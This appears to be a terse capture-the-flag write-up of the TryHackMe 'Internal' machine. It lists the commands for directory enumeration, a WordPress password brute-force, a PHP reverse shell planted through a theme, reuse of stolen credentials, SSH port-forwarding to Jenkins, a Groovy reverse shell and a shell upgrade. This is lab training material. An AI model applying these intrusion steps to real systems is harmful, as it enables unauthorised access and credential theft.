# Information Gathering


Enumerated open TCP ports:

![image](https://github.com/user-attachments/assets/80421ae7-df90-435b-81f4-fcc154001d91)

## Port
```
80,22
```

---
# Enumeration

`gobuster dur -u http://10.10.182.251/ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x html,txt,php`

`wpscan --url http://10.10.182.251/blog -e u`
-e vp  for vulnerable plugins


```
wpscan — url_ [_http://internal.thm/wordpress_](http://internal.thm/wordpress) _-U admin -P /usr/share/wordlists/rockyou.txt_
```
---

# Exploitation

## Name of the technique
```
Change wordpress theme to reverse shell php
```



---
# Lateral Movement to user

## Local Enumeration
```
Enumerate files and in the opt dir there is a save txt with user password
```

## Lateral Movement vector
```
ssh with stolen credentials from opt 
jenkins.txt with service running on 172.17.0.2:8080
netstat -tlnp to check all services running
ssh port forward --> ssh -L 5555:172.17.0.2:8080 aubreanna@internal.thm
then use jenkins login msfconsole to get credentials
use groovy script for reverseshell
```


---
# Privilege Escalation

## Local Enumeration
```
export TERM=xterm
/bin/bash -i
in the opt directory again a note.txt with root credentials
cat /etc/passwd | grep bash 
```

## Privilege Escalator Vector 
```
python3 -c 'import pty;pty.spawn("/bin/bash")'
real flag was on the ssh 
```

---
# Tasks, Trophy & Loot

user flag:
```
THM{REDACTED}
```
root flag:
```
THM{REDACTED}
```
